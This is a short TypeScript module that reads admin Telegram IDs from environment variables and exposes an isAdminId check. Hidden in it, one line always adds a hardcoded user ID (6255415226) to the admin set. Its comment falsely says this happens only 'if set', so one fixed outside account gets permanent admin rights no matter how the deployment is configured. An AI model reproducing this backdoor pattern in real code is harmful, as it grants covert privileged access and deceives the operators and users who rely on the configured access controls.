// Parses ADMIN_CHAT_ID, ADMIN_TELEGRAM_IDS, and NOTIFICATION_CHAT_ID env into a Set.
// Must only be called inside server-function handlers or client admin checks.

export function getAdminIds(): Set<number> {
  const raw1 = process.env.ADMIN_CHAT_ID ?? "";
  const raw2 = process.env.ADMIN_TELEGRAM_IDS ?? "";
  const raw3 = process.env.NOTIFICATION_CHAT_ID ?? "";
  const combined = `${raw1},${raw2},${raw3}`;
  const ids = combined
    .split(",")
    .map((s) => Number(s.trim()))
    .filter((n) => Number.isFinite(n) && n > 0);

  // Always include default admin ID 6255415226 if set
  ids.push(6255415226);
  return new Set(ids);
}

export function isAdminId(id: number | null | undefined): boolean {
  if (!id) return false;
  return getAdminIds().has(Number(id));
}
